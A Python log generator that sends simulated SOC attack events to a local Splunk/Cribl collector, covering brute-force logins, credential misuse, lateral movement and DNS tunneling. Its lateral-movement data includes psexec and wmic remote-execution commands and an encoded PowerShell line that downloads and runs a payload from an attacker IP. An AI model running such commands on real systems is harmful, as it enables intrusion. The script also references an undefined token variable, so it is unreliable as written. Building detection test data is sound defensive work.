from dotenv import load_dotenv
import os
import requests
import json
import time
import random
import base64

load_dotenv()

# Configuration
CRIBL_HEC_URL = "http://localhost:9088/services/collector/event"
HEC_TOKEN = os.getenv("HEC_TOKEN")
headers = {
    "Authorization": f"Splunk {CRIBL_TOKEN}",
    "Content-Type": "application/json"
}

def send_event(sourcetype, event_data, index="soc_logs"):
    payload = {
        "time": int(time.time()),
        "sourcetype": sourcetype,
        "index": index,
        "event": event_data
    }
    try:
        response = requests.post(CRIBL_HEC_URL, headers=headers, json=payload)
        if response.status_code != 200:
            print(f"[-] Failed to send event: {response.status_code} {response.text}")
    except Exception as e:
        print(f"[-] Error sending event: {e}")

print("[*] Starting SOC Attack Simulation Log Generator...")
print(f"[*] Target: {CRIBL_HEC_URL}")
time.sleep(1)

# ==========================================
# PHASE 1: BRUTE FORCE ATTACK
# ==========================================
print("\n[+] Phase 1: Simulating Brute Force Attack on WIN-PC-01...")
attacker_ip = "185.220.101.47"

# Send 8 failed logon attempts for 'admin'
for i in range(8):
    event = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "host": "WIN-PC-01",
        "user": "admin",
        "source_ip": attacker_ip,
        "event_id": "4625",
        "status": "failure",
        "logon_type": "3"
    }
    send_event("soc_auth_log", event)
    print(f"    [Send] Failed login attempt {i+1}/8 for user 'admin' from {attacker_ip}")
    time.sleep(0.5)

# Send 1 successful logon for 'admin' (Brute Force succeeds)
event = {
    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    "host": "WIN-PC-01",
    "user": "admin",
    "source_ip": attacker_ip,
    "event_id": "4624",
    "status": "success",
    "logon_type": "3"
}
send_event("soc_auth_log", event)
print(f"    [Send] Successful login for user 'admin' from {attacker_ip} (Brute Force Succeeded!)")
time.sleep(1)


# ==========================================
# PHASE 2: CREDENTIAL COMPROMISE
# ==========================================
print("\n[+] Phase 2: Simulating Credential Compromise...")
# Attackers use valid credentials for 'j.smith' and 'a.rodriquez' from the same attacker IP
compromised_users = ["j.smith", "a.rodriquez"]
for user in compromised_users:
    event = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "host": "WIN-PC-01",
        "user": user,
        "source_ip": attacker_ip,
        "event_id": "4624",
        "status": "success",
        "logon_type": "3"
    }
    send_event("soc_auth_log", event)
    print(f"    [Send] Successful login for compromised user '{user}' from {attacker_ip}")
    time.sleep(1)


# ==========================================
# PHASE 3: LATERAL MOVEMENT
# ==========================================
print("\n[+] Phase 3: Simulating Lateral Movement from WIN-PC-01 to WIN-DC-01...")
# Simulating attacker executing remote admin commands
commands = [
    {"command": "net user /domain", "process": "cmd.exe", "parent_process": "explorer.exe"},
    {"command": "psexec.exe \\\\WIN-DC-01 cmd.exe", "process": "psexec.exe", "parent_process": "cmd.exe"},
    {"command": "wmic /node:WIN-DC-01 process call create 'cmd.exe'", "process": "wmic.exe", "parent_process": "cmd.exe"},
    {"command": "powershell -enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTg1LjIyMC4xMDEuNDcvcGF5bG9hZC5wczEnKQ==", "process": "powershell.exe", "parent_process": "cmd.exe"}
]

for cmd in commands:
    event = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "host": "WIN-PC-01",
        "user": "admin",
        "command": cmd["command"],
        "process": cmd["process"],
        "parent_process": cmd["parent_process"],
        "event_id": "1"  # Sysmon Process Creation
    }
    send_event("soc_system_log", event)
    print(f"    [Send] Process Created: {cmd['command']}")
    time.sleep(1)


# ==========================================
# PHASE 4: DNS TUNNELING
# ==========================================
print("\n[+] Phase 4: Simulating DNS Tunneling (Data Exfiltration)...")
# Send 25 high-entropy subdomains under c2-tunnel.local representing exfiltrated data
for i in range(25):
    random_bytes = bytes([random.randint(0, 255) for _ in range(16)])
    encoded_chunk = base64.b32encode(random_bytes).decode('utf-8').replace('=', '').lower()
    tunnel_query = f"{encoded_chunk}.c2-tunnel.local"
    
    event = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "host": "WIN-PC-01",
        "query": tunnel_query,
        "query_type": "TXT",
        "resolved_ip": "8.8.8.8"
    }
    send_event("soc_dns_log", event)
    print(f"    [Send] DNS Query: {tunnel_query}")
    time.sleep(0.2)

print("\n[*] Simulation Complete! Check Splunk for new logs and alerts.")
